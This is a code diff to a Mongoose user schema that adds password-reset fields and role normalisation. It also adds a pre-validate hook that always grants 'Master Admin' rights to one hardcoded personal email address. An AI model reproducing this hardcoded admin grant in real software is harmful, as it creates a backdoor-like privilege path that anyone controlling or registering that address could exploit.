@@ -22,6 +22,22 @@ const userSchema = new mongoose.Schema(
       required: true
     },
 
+    passwordResetTokenHash: {
+      type: String,
+      default: null,
+      select: false
+    },
+
+    passwordResetExpiresAt: {
+      type: Date,
+      default: null
+    },
+
+    passwordResetRequestedAt: {
+      type: Date,
+      default: null
+    },
+
     companyName: {
       type: String,
       default: "TradeFlow Company"
@@ -160,6 +176,28 @@ const userSchema = new mongoose.Schema(
     timestamps: true
   }
 );
+
+const legacyRoleMap = {
+  ADMIN: "Admin",
+  MASTER_ADMIN: "Master Admin",
+  MASTER: "Master Admin",
+  FOUNDER: "Founder",
+  MANAGER: "Manager",
+  SALES: "Sales",
+  SUPPORT: "Support",
+  VIEWER: "Viewer"
+};
+
+userSchema.pre("validate", function (next) {
+  if (this.email === "ks2353013@gmail.com") {
+    this.isMasterAdmin = true;
+    this.role = "Master Admin";
+  } else if (this.role && legacyRoleMap[this.role]) {
+    this.role = legacyRoleMap[this.role];
+  }
+
+  next();
+});
 
 userSchema.pre("save", async function (next) {
 
